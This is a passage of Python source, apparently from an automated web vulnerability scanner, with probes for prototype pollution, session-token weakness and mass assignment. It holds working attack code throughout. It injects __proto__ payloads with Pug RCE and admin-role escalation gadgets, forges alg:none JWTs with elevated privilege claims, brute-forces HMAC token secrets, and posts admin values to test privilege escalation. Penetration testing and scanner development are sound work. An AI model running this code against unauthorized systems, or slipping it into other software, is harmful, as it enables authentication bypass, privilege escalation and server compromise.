_PP_BUDGET = 45

_PP_PROBE_KEY   = "x_sspp_" + secrets.token_hex(3)
_PP_PROBE_VALUE = "sspp_" + secrets.token_hex(4)


_PP_QS_PROBES: List[str] = [
    "__proto__[%s]=%s",
    "constructor[prototype][%s]=%s",
]


def discover_prototype_pollution_oracle(base: str) -> ScanFindings:
    out: ScanFindings = []
    _seen: Set[str] = set()
    _probe_n: List[int] = [0]

    def _emit(msg: str, evidence: str = "") -> None:
        if msg not in _seen:
            _seen.add(msg)
            out.append((msg, evidence))

    def _post_json(url: str, body: str, timeout: float = 8.0) -> Tuple[int, bytes]:
        if _probe_n[0] >= _PP_BUDGET:
            return 0, b""
        _probe_n[0] += 1
        try:
            st, _, rb, _ = _req(url, method="POST", data=body.encode(),
                                  content_type="application/json", timeout=timeout)
            return st, rb
        except Exception:
            return 0, b""

    def _get_url(url: str, timeout: float = 8.0) -> Tuple[int, bytes]:
        if _probe_n[0] >= _PP_BUDGET:
            return 0, b""
        _probe_n[0] += 1
        try:
            st, _, rb, _ = _req(url, timeout=timeout)
            return st, rb
        except Exception:
            return 0, b""

    parsed = urllib.parse.urlparse(base)
    _host = parsed.hostname or ""
    if not _host:
        return out

    _api_endpoints: List[str] = [base]
    for _ep in list(_DISCOVERED_ENDPOINTS)[:20]:
        if any(k in _ep.lower() for k in ["/api/", "/v1/", "/v2/", "/user",
                                            "/profile", "/settings", "/update",
                                            "/create", "/register", "/login"]):
            _api_endpoints.append(_ep)
    _api_endpoints = list(dict.fromkeys(_api_endpoints))[:8]

    _pp_qs_confirmed = False
    for _qs_fmt in _PP_QS_PROBES:
        if _probe_n[0] >= _PP_BUDGET or _pp_qs_confirmed:
            break
        _qs_payload = _qs_fmt % (_PP_PROBE_KEY, _PP_PROBE_VALUE)
        _sep = "&" if "?" in base else "?"
        _qs_url = base + _sep + _qs_payload

        _st_qs, _rb_qs = _get_url(_qs_url)
        _body_qs = _rb_qs.decode(errors="replace")

        if _PP_PROBE_VALUE in _body_qs:
            _pp_qs_confirmed = True
            _emit(
                "[PP][CRITICAL] Query-string prototype pollution confirmed "
                "at %s - injected '%s=%s' via %s and probe value reflected "
                "in response; qs-library parsed __proto__ as Object.prototype; "
                "the polluted property is inherited by ALL objects in this "
                "Node.js process for all subsequent requests" % (
                    base, _PP_PROBE_KEY, _PP_PROBE_VALUE, _qs_fmt.split("[")[0]),
                "url=%s qs_fmt=%s probe=%s=%s" % (
                    base, _qs_fmt, _PP_PROBE_KEY, _PP_PROBE_VALUE),
            )

    _pp_json_confirmed = False
    for _endpoint in _api_endpoints[:5]:
        if _probe_n[0] >= _PP_BUDGET or _pp_json_confirmed:
            break
        for _json_fmt, _label in _PP_JSON_PROBES:
            if _probe_n[0] >= _PP_BUDGET:
                break
            _body_pl = _json_fmt % (_PP_PROBE_KEY, _PP_PROBE_VALUE)
            _st_j, _rb_j = _post_json(_endpoint, _body_pl)
            _body_j = _rb_j.decode(errors="replace")

            if _probe_n[0] < _PP_BUDGET:
                _st_chk, _rb_chk = _get_url(_endpoint)
                _body_chk = _rb_chk.decode(errors="replace")
                if _PP_PROBE_VALUE in _body_chk:
                    _pp_json_confirmed = True
                    _emit(
                        "[PP][CRITICAL] Server-side prototype pollution via "
                        "JSON %s at %s - polluted '%s' persists across "
                        "requests; follow-up GET returned the injected value; "
                        "Object.prototype has been mutated globally; every "
                        "object in the process inherits the polluted property"
                        % (_label, _endpoint, _PP_PROBE_KEY),
                        "endpoint=%s label=%s key=%s value=%s" % (
                            _endpoint, _label, _PP_PROBE_KEY, _PP_PROBE_VALUE),
                    )
                    break
            elif _PP_PROBE_VALUE in _body_j:
                _pp_json_confirmed = True
                _emit(
                    "[PP][HIGH] Prototype pollution same-request reflection "
                    "at %s via %s - injected value '%s' echoed in response; "
                    "JSON parser treats __proto__ as a regular key OR app "
                    "serializes the prototype properties back to client"
                    % (_endpoint, _label, _PP_PROBE_VALUE),
                    "endpoint=%s label=%s" % (_endpoint, _label),
                )
                break

    if _pp_qs_confirmed or _pp_json_confirmed:
        for _g_label, _g_payload, _g_detect in _PP_ESCALATION_GADGETS:
            if _probe_n[0] >= _PP_BUDGET:
                break
            _st_g, _rb_g = _post_json(base, _g_payload)
            _body_g = _rb_g.decode(errors="replace")
            if _probe_n[0] < _PP_BUDGET:
                _probe_n[0] += 1
                try:
                    _, _, _rb_g2, _ = _req(base, timeout=8.0)
                    _body_g2 = _rb_g2.decode(errors="replace")
                except Exception:
                    _body_g2 = ""
            else:
                _body_g2 = _body_g

            if _g_detect in _body_g or _g_detect in _body_g2:
                if _g_label == "template_pug_rce" and "uid=" in _body_g + _body_g2:
                    _emit(
                        "[PP][CRITICAL] Prototype pollution -> RCE via Pug "
                        "template gadget - 'id' command output detected in "
                        "response after polluting __proto__.block; the Pug "
                        "template engine used the polluted block property as "
                        "a code execution context; full server compromise" ,
                        "gadget=%s uid_detected=True" % _g_label,
                    )
                elif _g_label == "admin_role":
                    _emit(
                        "[PP][CRITICAL] Prototype pollution -> privilege "
                        "escalation - 'isAdmin:true' and 'role:admin' "
                        "injected into Object.prototype; subsequent requests "
                        "from any user will inherit admin:true, potentially "
                        "granting admin access to all users on this process",
                        "gadget=%s admin_reflected=True" % _g_label,
                    )
                else:
                    _emit(
                        "[PP][HIGH] Prototype pollution gadget '%s' triggered "
                        "? behavioral change confirmed in follow-up response"
                        % _g_label,
                        "gadget=%s detect=%s" % (_g_label, _g_detect),
                    )

    if _probe_n[0] + 2 <= _PP_BUDGET:
        _lodash_pl = json.dumps({
            "options": {
                "__proto__": {_PP_PROBE_KEY: _PP_PROBE_VALUE + "_lodash"}
            }
        })
        _st_lo, _rb_lo = _post_json(base, _lodash_pl)
        if _probe_n[0] < _PP_BUDGET:
            _st_lo2, _rb_lo2 = _get_url(base)
            if (_PP_PROBE_VALUE + "_lodash").encode() in _rb_lo2:
                _emit(
                    "[PP][CRITICAL] Prototype pollution via nested __proto__ "
                    "in merge operation at %s - lodash-style deep merge "
                    "polluted Object.prototype through nested __proto__ key; "
                    "this pattern occurs in lodash <4.17.11, jQuery, "
                    "and similar merge utilities" % base,
                    "gadget=lodash_merge probe=%s_lodash" % _PP_PROBE_KEY,
                )

    if not (_pp_qs_confirmed or _pp_json_confirmed):
        _emit(
            "[pp][INFO] No prototype pollution detected (%d probes) - "
            "server may not use qs/body-parser or sanitises __proto__ keys"
            % _probe_n[0],
            "endpoints_tested=%d" % len(_api_endpoints),
        )

    out.append((
        "[pp] prototype pollution oracle complete - %d probes fired" % _probe_n[0],
        "qs_pp=%s json_pp=%s endpoints=%d" % (
            _pp_qs_confirmed, _pp_json_confirmed, len(_api_endpoints)),
    ))
    return out

_TOK_BUDGET    = 80
_TOK_COLLECT_N = 28

_TOK_JWT_RE = re.compile(
    r'ey[A-Za-z0-9_-]{10,}\.ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*'
)
_TOK_UUID_V1_RE = re.compile(
    r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
    re.I,
)


_TOK_JWT_NONE_ALGS: List[str] = ["none", "None", "NONE", "nOnE", "NoNe"]


def discover_session_oracle(base: str) -> ScanFindings:
    out: ScanFindings = []
    _seen: Set[str] = set()
    _probe_n: List[int] = [0]

    def _emit(msg: str, evidence: str = "") -> None:
        if msg not in _seen:
            _seen.add(msg)
            out.append((msg, evidence))

    def _fetch(url: str, method: str = "GET", data: bytes = b"",
               ct: str = "", hdrs: dict = None,
               timeout: float = 8.0) -> Tuple[int, dict, bytes]:
        if _probe_n[0] >= _TOK_BUDGET:
            return 0, {}, b""
        _probe_n[0] += 1
        try:
            _st, _rh, _body, _ = _req(
                url, method=method,
                data=data if data else None,
                content_type=ct if ct else None,
                headers=hdrs or {},
                timeout=timeout,
            )
            return _st, _rh, _body
        except Exception:
            return 0, {}, b""

    def _shannon(data: bytes) -> float:
        if not data:
            return 0.0
        n = len(data)
        freq: Dict[int, int] = {}
        for b in data:
            freq[b] = freq.get(b, 0) + 1
        return -sum((c / n) * math.log2(c / n) for c in freq.values())

    def _chi_sq(data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        expected = len(data) / 256.0
        return sum((f - expected) ** 2 / expected for f in freq)

    def _b64url_dec(s: str) -> bytes:
        s += "=" * (-len(s) % 4)
        try:
            return base64.urlsafe_b64decode(s)
        except Exception:
            return b""

    def _detect_enc(tok: str) -> str:
        if _TOK_JWT_RE.fullmatch(tok):
            return "jwt"
        if _TOK_UUID_V1_RE.fullmatch(tok):
            return "uuid_v1"
        if re.fullmatch(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-4[0-9a-fA-F]{3}'
                        r'-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}', tok):
            return "uuid_v4"
        if re.fullmatch(r'[0-9a-fA-F]{16,}', tok):
            return "hex"
        if re.fullmatch(r'[A-Za-z0-9_-]{16,}', tok) and ("-" in tok or "_" in tok):
            return "base64url"
        if re.fullmatch(r'[A-Za-z0-9+/]{16,}={0,2}', tok):
            return "base64"
        if re.fullmatch(r'\d{8,}', tok):
            return "decimal"
        return "alphanum"

    def _tok_bytes(tok: str, enc: str) -> bytes:
        try:
            if enc == "hex":
                return bytes.fromhex(tok)
            if enc == "base64url":
                return _b64url_dec(tok)
            if enc == "base64":
                return base64.b64decode(tok + "==")
            if enc in ("uuid_v1", "uuid_v4"):
                return bytes.fromhex(tok.replace("-", ""))
        except Exception:
            pass
        return tok.encode()

    def _jwt_hmac_ok(hp: str, sig: bytes, secret: bytes, algo: str) -> bool:
        _hfn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                "HS512": hashlib.sha512}.get(algo.upper(), hashlib.sha256)
        try:
            return hmac.new(secret, hp.encode(), _hfn).digest() == sig
        except Exception:
            return False

    parsed = urllib.parse.urlparse(base)
    _host = parsed.hostname or ""
    if not _host:
        return out

    _jwt_secs = list(_TOK_JWT_WEAK_SECRETS) + [
        _host, _host.split(".")[0],
        _host.replace(".", ""),
        _host.split(".")[0] + "_secret",
        _host.split(".")[0] + "secret",
    ]

    _collected: List[Tuple[str, str, float]] = []
    _cookie_audit: List[Tuple[str, str, str]] = []

    def _extract(url: str, rh: dict, body: bytes) -> None:
        _ts = time.time()
        for _sc in re.split(r'\n', (rh or {}).get("set-cookie", "") or ""):
            if not _sc.strip() or "=" not in _sc:
                continue
            _pp = [p.strip() for p in _sc.split(";")]
            _nv = _pp[0].split("=", 1)
            if len(_nv) != 2:
                continue
            _cn, _cv = _nv[0].strip(), _nv[1].strip()
            _flags = " ".join(_pp[1:]).lower()
            _cookie_audit.append((_cn, _cv, _flags))
            if len(_cv) >= 8:
                _collected.append((_cv, url, _ts))
        if not body:
            return
        _bstr = body.decode(errors="replace")
        for _m in _TOK_JWT_RE.finditer(_bstr):
            _collected.append((_m.group(0), url, _ts))
        try:
            _jd = json.loads(body)
            def _walk(obj: object) -> None:
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if isinstance(v, str) and len(v) >= 8:
                            if any(w in k.lower() for w in
                                   ["token", "session", "csrf", "key", "jwt",
                                    "auth", "access", "refresh", "secret", "nonce"]):
                                _collected.append((v, url, _ts))
                        else:
                            _walk(v)
                elif isinstance(obj, list):
                    for item in obj:
                        _walk(item)
            _walk(_jd)
        except Exception:
            pass
        for _m in re.finditer(
                rb'<input[^>]+type=["\']hidden["\'][^>]+'
                rb'name=["\']([^"\']*(?:csrf|token|nonce|_token)[^"\']*)["\'][^>]+'
                rb'value=["\']([^"\']{8,})["\']',
                body, re.I):
            _collected.append((_m.group(2).decode(errors="replace"), url, _ts))

    _st0, _rh0, _body0 = _fetch(base)
    _extract(base, _rh0, _body0)

    for _path, _method, _btpl in _TOK_HARVEST_PATHS:
        if _probe_n[0] >= _TOK_BUDGET or len(_collected) >= _TOK_COLLECT_N:
            break
        _url = urllib.parse.urljoin(base, _path)
        _i = len(_collected)
        _bd = (_btpl % (_i, _i) if "%d" in _btpl else _btpl).encode()
        _ct = ("application/json" if _btpl.startswith("{")
               else "application/x-www-form-urlencoded" if _bd else "")
        _st, _rh, _body = _fetch(_url, _method, _bd, _ct)
        _extract(_url, _rh, _body)

    for _ep in list(_DISCOVERED_ENDPOINTS)[:12]:
        if _probe_n[0] >= _TOK_BUDGET or len(_collected) >= _TOK_COLLECT_N:
            break
        _st, _rh, _body = _fetch(_ep)
        _extract(_ep, _rh, _body)

    _seen_raw: Set[str] = set()
    _tokens: List[Tuple[str, str, float]] = []
    for _raw, _src, _ts in _collected:
        if _raw not in _seen_raw and len(_raw) >= 8:
            _seen_raw.add(_raw)
            _tokens.append((_raw, _src, _ts))

    _seen_cnames: Set[str] = set()
    for _cn, _cv, _flags in _cookie_audit:
        if _cn in _seen_cnames:
            continue
        _seen_cnames.add(_cn)
        _issues = []
        if "httponly" not in _flags:
            _issues.append("HttpOnly missing")
        if "secure" not in _flags:
            _issues.append("Secure missing")
        if "samesite" not in _flags:
            _issues.append("SameSite missing")
        elif "samesite=none" in _flags and "secure" not in _flags:
            _issues.append("SameSite=None without Secure")
        if _issues:
            _emit(
                "[TOKEN][MEDIUM] Cookie '%s' missing security flags: %s"
                % (_cn, "; ".join(_issues)),
                "cookie=%s flags='%s'" % (_cn, _flags[:80]),
            )
        try:
            _rb2 = (bytes.fromhex(_cv) if re.fullmatch(r'[0-9a-fA-F]+', _cv)
                    else _cv.encode())
            if len(_rb2) < 16:
                _emit(
                    "[TOKEN][HIGH] Cookie '%s' is %d bytes - below 16-byte minimum; "
                    "brute-force space ~ 2^%d"
                    % (_cn, len(_rb2), len(_rb2) * 8),
                    "cookie=%s raw_len=%d" % (_cn, len(_rb2)),
                )
        except Exception:
            pass

    if not _tokens:
        _emit("[token][INFO] No tokens collected (%d probes)" % _probe_n[0],
              "harvest_paths=%d" % len(_TOK_HARVEST_PATHS))
        out.append(("[token] session oracle complete - 0 tokens", ""))
        return out

    _tok_meta: List[Dict] = []
    for _raw, _src, _ts in _tokens:
        _enc = _detect_enc(_raw)
        _rb  = _tok_bytes(_raw, _enc)
        _ent = _shannon(_rb)
        _chi = _chi_sq(_rb)
        _tok_meta.append({"raw": _raw, "src": _src, "ts": _ts,
                          "enc": _enc, "bytes": _rb,
                          "entropy": _ent, "chi2": _chi})
        if _enc not in ("jwt", "uuid_v1", "uuid_v4") and len(_rb) >= 8:
            if _ent < 3.5:
                _emit(
                    "[TOKEN][HIGH] Low-entropy token from %s - %.2f bits/byte "
                    "(CSPRNG >=3.5 expected); weak or seeded PRNG"
                    % (_src, _ent),
                    "token=%s enc=%s entropy=%.2f chi2=%.1f"
                    % (_raw[:32], _enc, _ent, _chi),
                )
            elif _chi > 400.0:
                _emit(
                    "[TOKEN][MEDIUM] Non-uniform token distribution from %s - "
                    "chi^2=%.1f (uniform <=300); detectable PRNG bias"
                    % (_src, _chi),
                    "token=%s enc=%s chi2=%.1f" % (_raw[:32], _enc, _chi),
                )

    _int_toks: List[int] = []
    for _m in _tok_meta:
        if len(_m["bytes"]) >= 4 and _m["enc"] not in ("jwt", "uuid_v1", "uuid_v4"):
            _int_toks.append(struct.unpack(">I", _m["bytes"][-4:])[0])

    if len(_int_toks) >= 4:
        _diffs = [_int_toks[i+1] - _int_toks[i] for i in range(len(_int_toks) - 1)]
        _nz = [d for d in _diffs if d != 0]
        if _nz and len(set(_nz)) == 1:
            _step = _nz[0]
            _emit(
                "[TOKEN][CRITICAL] Sequential counter tokens detected - "
                "every consecutive token differs by exactly %d; "
                "next session ID predictable: %d; "
                "attacker can enumerate all active sessions"
                % (_step, _int_toks[-1] + _step),
                "step=%d sample=%s next=%d"
                % (_step, str(_int_toks[:4]), _int_toks[-1] + _step),
            )
        elif _nz and len(set(_nz)) <= 2 and len(_nz) >= 4:
            _emit(
                "[TOKEN][HIGH] Near-sequential tokens - diffs cluster in %d values %s; "
                "token space is far smaller than byte length implies"
                % (len(set(_nz)), str(sorted(set(_nz)))[:60]),
                "diff_values=%s int_sample=%s" % (str(sorted(set(_nz))), str(_int_toks[:6])),
            )

    _now_ts = int(time.time())
    _ts_hits: List[Tuple[str, int]] = []
    for _m in _tok_meta:
        _b = _m["bytes"]
        for _off in range(max(0, len(_b) - 3)):
            try:
                _cand = struct.unpack(">I", _b[_off:_off+4])[0]
                if abs(_cand - _now_ts) < 86400 * 365:
                    _ts_hits.append((_m["raw"][:32], _cand))
                    break
            except Exception:
                pass
    if len(_ts_hits) >= 2:
        _emit(
            "[TOKEN][HIGH] Timestamp-embedded tokens - %d tokens contain Unix timestamps "
            "within +/-1 year; generation window narrowable to +/-1s; "
            "brute-force space reduced to ~%d candidates per user"
            % (len(_ts_hits), 86400 * 2),
            "sample_ts=%s" % str([t[1] for t in _ts_hits[:3]]),
        )

    if len(_int_toks) >= 8:
        _mean = sum(_int_toks) / len(_int_toks)
        _cov  = sum((_int_toks[i] - _mean) * (_int_toks[i+1] - _mean)
                    for i in range(len(_int_toks) - 1))
        _var  = sum((x - _mean) ** 2 for x in _int_toks)
        if _var > 0:
            _r = _cov / _var
            if abs(_r) > 0.3:
                _emit(
                    "[TOKEN][HIGH] Linear PRNG structure detected - "
                    "lag-1 autocorrelation r=%.3f (CSPRNG |r|<0.05 expected); "
                    "consistent with LCG or time-seeded MT19937; "
                    "collect 624 consecutive 32-bit outputs to fully reconstruct state"
                    % _r,
                    "r=%.3f n=%d int_sample=%s" % (_r, len(_int_toks), str(_int_toks[:4])),
                )

    _jwt_metas = [_m for _m in _tok_meta if _m["enc"] == "jwt"]
    for _jm in _jwt_metas[:5]:
        _jtok = _jm["raw"]
        _parts = _jtok.split(".")
        if len(_parts) != 3:
            continue
        try:
            _jhdr = json.loads(_b64url_dec(_parts[0]))
            _jpay = json.loads(_b64url_dec(_parts[1]))
            _jsig = _b64url_dec(_parts[2])
        except Exception:
            continue
        _alg = _jhdr.get("alg", "")
        _hp  = _parts[0] + "." + _parts[1]

        _exp = _jpay.get("exp")
        if _exp is None:
            _emit(
                "[TOKEN][HIGH] JWT missing 'exp' claim (from %s) - "
                "token never expires; stolen credentials valid indefinitely"
                % _jm["src"],
                "alg=%s payload=%s" % (_alg, str(_jpay)[:100]),
            )
        elif isinstance(_exp, (int, float)) and (_exp - time.time()) > 86400 * 30:
            _emit(
                "[TOKEN][MEDIUM] JWT has %d-day expiry (from %s)"
                % (int((_exp - time.time()) // 86400), _jm["src"]),
                "alg=%s exp=%s" % (_alg, str(_exp)),
            )

        for _hk in ("kid", "jku", "x5u"):
            _hv = _jhdr.get(_hk, "")
            if _hv and ("http" in str(_hv).lower() or "/" in str(_hv)):
                _emit(
                    "[TOKEN][HIGH] JWT '%s' header contains URL '%s' (from %s) - "
                    "server fetches this URL to load signing key; SSRF or key injection"
                    % (_hk, str(_hv)[:80], _jm["src"]),
                    "header=%s value=%s" % (_hk, str(_hv)[:80]),
                )

        if _alg.lower() not in ("none",) and _probe_n[0] + 2 <= _TOK_BUDGET:
            _fp = dict(_jpay)
            for _pk in ("admin", "role", "is_admin", "isAdmin", "group", "scope"):
                if _pk in _fp:
                    _orig = _fp[_pk]
                    _fp[_pk] = (True if isinstance(_orig, bool)
                                else "admin" if isinstance(_orig, str)
                                else 1)
            _fp_enc = base64.urlsafe_b64encode(
                json.dumps(_fp, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            for _na in _TOK_JWT_NONE_ALGS[:2]:
                if _probe_n[0] >= _TOK_BUDGET:
                    break
                _nh = dict(_jhdr)
                _nh["alg"] = _na
                _nh_enc = base64.urlsafe_b64encode(
                    json.dumps(_nh, separators=(",", ":")).encode()
                ).rstrip(b"=").decode()
                _forged = _nh_enc + "." + _fp_enc + "."
                _probe_n[0] += 1
                try:
                    _fst, _, _fb, _ = _req(
                        _jm["src"], timeout=8.0,
                        headers={"Authorization": "Bearer " + _forged,
                                 "Cookie": "session=" + _forged},
                    )
                    if _fst not in (400, 401, 403, 422) and len(_fb) > 50:
                        _emit(
                            "[TOKEN][CRITICAL] JWT alg:none forgery ACCEPTED at %s - "
                            "alg='%s' with mutated privilege claims accepted (HTTP %d); "
                            "full authentication bypass confirmed"
                            % (_jm["src"], _na, _fst),
                            "alg=%s forged=%s status=%d" % (_na, _forged[:80], _fst),
                        )
                        break
                except Exception:
                    pass

        if _alg.upper().startswith("HS") and _jsig:
            for _sec in _jwt_secs:
                if _jwt_hmac_ok(_hp, _jsig, _sec.encode(), _alg):
                    _emit(
                        "[TOKEN][CRITICAL] JWT HMAC secret cracked - secret='%s' "
                        "(alg=%s); attacker can forge any token payload offline"
                        % (_sec, _alg),
                        "secret=%s alg=%s src=%s" % (_sec, _alg, _jm["src"]),
                    )
                    break

    for _m in [_m for _m in _tok_meta if _m["enc"] == "uuid_v1"][:3]:
        _us = _m["raw"].replace("-", "")
        try:
            _t_low = int(_us[0:8],   16)
            _t_mid = int(_us[8:12],  16)
            _t_hi  = int(_us[12:16], 16) & 0x0FFF
            _ts100 = (_t_hi << 48) | (_t_mid << 32) | _t_low
            _unix  = (_ts100 - 122192928000000000) / 1e7
            _mac   = ":".join(_us[20+i*2:22+i*2] for i in range(6))
            _emit(
                "[TOKEN][HIGH] UUID v1 exposes server fingerprint - "
                "MAC=%s, generation_time=%.6f (+/-100ns precision); "
                "MAC identifies physical NIC or VM hypervisor; "
                "timestamp gives exact token issuance window"
                % (_mac, _unix),
                "uuid=%s mac=%s unix_ts=%.3f" % (_m["raw"], _mac, _unix),
            )
        except Exception:
            pass

    _hmac_cands = [_m for _m in _tok_meta
                   if _m["enc"] in ("hex", "base64", "base64url")
                   and len(_m["bytes"]) in (20, 28, 32)]
    for _m in _hmac_cands[:3]:
        if _probe_n[0] >= _TOK_BUDGET:
            break
        _target = _m["bytes"]
        _coll_ts = int(_m["ts"])
        _cracked = False
        for _sec in _jwt_secs[:20]:
            if _cracked:
                break
            for _algo_name, _dlen in [("sha1", 20), ("sha256", 32), ("sha224", 28)]:
                if len(_target) != _dlen:
                    continue
                _hfn = getattr(hashlib, _algo_name)
                for _delta in range(-60, 61):
                    _ts_b = (_coll_ts + _delta).to_bytes(4, "big")
                    if hmac.new(_sec.encode(), _ts_b, _hfn).digest() == _target:
                        _emit(
                            "[TOKEN][CRITICAL] Token is HMAC-%s(secret='%s', ts%+ds) - "
                            "attacker can generate valid tokens for any past or future second"
                            % (_algo_name.upper(), _sec, _delta),
                            "algo=%s secret=%s delta=%d tok=%s"
                            % (_algo_name, _sec, _delta, _m["raw"][:32]),
                        )
                        _cracked = True
                        break
                if _cracked:
                    break

    _reset_eps = [
        _ep for _ep in list(_DISCOVERED_ENDPOINTS)[:30]
        if any(k in _ep.lower() for k in ["reset", "forgot", "password", "recover"])
    ] + [urllib.parse.urljoin(base, p)
         for p in ["/password/reset", "/forgot",
                   "/api/forgot", "/api/password/reset"]]

    for _rep in _reset_eps[:3]:
        if _probe_n[0] + 2 > _TOK_BUDGET:
            break
        _t1 = _t2 = ""
        for _attempt in range(2):
            _probe_n[0] += 1
            _rb3 = b""
            try:
                _, _, _rb3, _ = _req(
                    _rep, method="POST",
                    data=b"email=security-test%40localhost.invalid",
                    content_type="application/x-www-form-urlencoded",
                    timeout=8.0,
                )
            except Exception:
                pass
            if _rb3:
                for _mj in _TOK_JWT_RE.finditer(_rb3.decode(errors="replace")):
                    if _attempt == 0:
                        _t1 = _mj.group(0)
                    else:
                        _t2 = _mj.group(0)
                    break
                if not (_t1 if _attempt == 0 else _t2):
                    _mv = re.search(
                        rb'"(?:token|reset_token|key)"\s*:\s*"([^"]{12,})"', _rb3)
                    if _mv:
                        _tv = _mv.group(1).decode()
                        if _attempt == 0:
                            _t1 = _tv
                        else:
                            _t2 = _tv
        if _t1 and _t2:
            if _t1 == _t2:
                _emit(
                    "[TOKEN][CRITICAL] Password reset tokens are deterministic at %s - "
                    "two sequential requests for same email produced identical tokens; "
                    "token is NOT randomly generated or NOT invalidated after issuance"
                    % _rep,
                    "endpoint=%s tok=%s" % (_rep, _t1[:40]),
                )
            else:
                _emit(
                    "[TOKEN][INFO] Reset tokens rotate at %s (distinct tokens confirmed)"
                    % _rep,
                    "endpoint=%s" % _rep,
                )

    _total = _probe_n[0]
    out.append((
        "[token] session oracle complete - %d probes, %d tokens collected, "
        "%d JWT, %d UUID-v1, %d cookies audited"
        % (_total, len(_tokens), len(_jwt_metas),
           sum(1 for _m in _tok_meta if _m["enc"] == "uuid_v1"),
           len(_cookie_audit)),
        "enc_types=%s entropy=[%.2f..%.2f]"
        % (str(sorted({_m["enc"] for _m in _tok_meta})),
           min((m["entropy"] for m in _tok_meta), default=0.0),
           max((m["entropy"] for m in _tok_meta), default=0.0)),
    ))
    return out

_LING_BUDGET = 45

_LING_PRIV_VALUES: List[str] = ["admin", "true", "1", "superuser", "root", "staff", "premium", "True", "yes"]
_LING_TODO_RE       = re.compile(r'(?:TODO|FIXME|HACK|XXX|WORKAROUND|KLUDGE)\s*:?\s*(.{10,140})', re.I)
_LING_DEBUG_RE      = re.compile(r'\b(?:console\.log|debugger;?|var_dump\(|print_r\(|\bdd\(|dump\(|ray\()\b', re.I)
_LING_ABS_PATH_RE   = re.compile(r'(?:[A-Za-z]:[/\\]|(?<!["\w])/(?:home|var|srv|opt|usr|app|root)/)[^\s"\'<>]{4,80}')
_LING_SECRET_RE     = re.compile(r'(?:password|passwd|secret|api[_-]?key|token|private[_-]?key|auth[_-]?key)\s*[=:]\s*["\']([^"\']{4,80})["\']', re.I)
_LING_FIELD_RE      = re.compile(r'\bname=["\']([a-zA-Z_][a-zA-Z0-9_\-]{1,40})["\']')
_LING_QS_RE         = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=')
_LING_JS_KEY_RE     = re.compile(r'["\']([a-zA-Z_][a-zA-Z0-9_]{2,30})["\']:\s*(?:true|false|null|\d+|["\'])')
_LING_REST_RE       = re.compile(r'/([a-zA-Z][a-zA-Z0-9_-]{1,30})/(\d+|[a-f0-9\-]{8,36})(?:/|$|\-)')
_LING_TEMPORAL_RE   = re.compile(r'\b(expir(?:es|ed|y|ation)|valid[_-]?(?:until|to|through)|ttl|timeout|deadline|not[_-]?after|not[_-]?before|exp|nbf|iat)\b', re.I)
_LING_JS_SRC_RE     = re.compile(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', re.I)

def discover_linguistic_attack_oracle(base: str) -> ScanFindings:
    out: ScanFindings = []
    budget = [_LING_BUDGET]

    def _get(url: str, **kw) -> Tuple[int, Dict, bytes, str]:
        if budget[0] <= 0:
            return 0, {}, b"", url
        budget[0] -= 1
        return _req(url, **kw)

    _, _, home_b, _ = _get(base, use_cache=True)
    homepage = home_b.decode("utf-8", "ignore")
    corpus = homepage

    js_urls = []
    for src in _LING_JS_SRC_RE.findall(homepage)[:10]:
        u = src if src.startswith("http") else _join_url(base, src)
        if _host_of(u) == _host_of(base):
            js_urls.append(u)
    if js_urls and budget[0] > 0:
        with ThreadPoolExecutor(max_workers=min(6, len(js_urls))) as _jex:
            for _jb in _jex.map(lambda u: _req(u, use_cache=True)[2], js_urls[:6]):
                corpus += "\n" + _jb.decode("utf-8", "ignore")
                budget[0] -= 1

    for path in ("/robots.txt", "/sitemap.xml"):
        _, _, _rb, _ = _get(_join_url(base, path), use_cache=True)
        corpus += "\n" + _rb.decode("utf-8", "ignore")

    _SEC_KW = {"auth", "login", "token", "bypass", "check", "verify", "admin",
               "permission", "role", "access", "secret", "key", "password",
               "fix", "remove", "disable", "skip", "unauthenticated", "unprotected"}
    seen_comments: Set[str] = set()
    for m in _LING_TODO_RE.finditer(corpus):
        comment = m.group(1).strip()
        key = comment[:60]
        if key in seen_comments:
            continue
        seen_comments.add(key)
        if set(re.findall(r'\w+', comment.lower())) & _SEC_KW:
            out.append((
                "[DEV-COMMENT] Security-relevant TODO/FIXME in client-visible code - "
                "may reveal an unimplemented auth check or planned security bypass",
                comment[:120]
            ))

    debug_hits = list(dict.fromkeys(_LING_DEBUG_RE.findall(corpus)))[:5]
    if debug_hits:
        out.append((
            "[DEBUG-LEAK] Debug calls found in production JS/HTML - "
            "may expose internal state, parameter names, or sensitive data in the browser console",
            ", ".join(debug_hits)
        ))

    paths = list(dict.fromkeys(_LING_ABS_PATH_RE.findall(corpus)))[:4]
    if paths:
        out.append((
            "[PATH-DISCLOSURE] Absolute filesystem paths in client-visible code - "
            "reveals server OS, directory layout, and deployment environment",
            " | ".join(paths)
        ))
    _BAD_VALS = {"password", "secret", "example", "changeme", "your-key", "xxxxxxxx", "placeholder"}
    for secret in list(dict.fromkeys(_LING_SECRET_RE.findall(corpus)))[:4]:
        if len(set(secret)) > 4 and secret.lower().strip("'\"") not in _BAD_VALS:
            out.append((
                "[HARDCODED-SECRET] Credential or key literal in client-visible code",
                secret[:6] + "***"
            ))

    all_fields: Set[str] = (set(_LING_FIELD_RE.findall(homepage))
                            | set(_LING_QS_RE.findall(corpus))
                            | set(_LING_JS_KEY_RE.findall(corpus)))
    _, _, base_b, _ = _get(base, use_cache=True)

    def _probe_priv(args: Tuple[str, str, str]) -> ScanFindings:
        field, val, cluster = args
        if budget[0] <= 0:
            return []
        c, _, rb, _ = _get(base, method="POST",
                           data=json.dumps({field: val}).encode(),
                           content_type="application/json")
        if c not in (200, 201) or rb == base_b:
            return []
        text = rb.decode("utf-8", "ignore")
        _PRIV_SIGS = {"admin", "dashboard", "privilege", "elevated", "granted",
                      "superuser", "staff", "premium", "success", "root", "welcome"}
        if any(sig in text.lower() for sig in _PRIV_SIGS):
            return [("[CONFIRMED] Mass-assignment privilege escalation: "
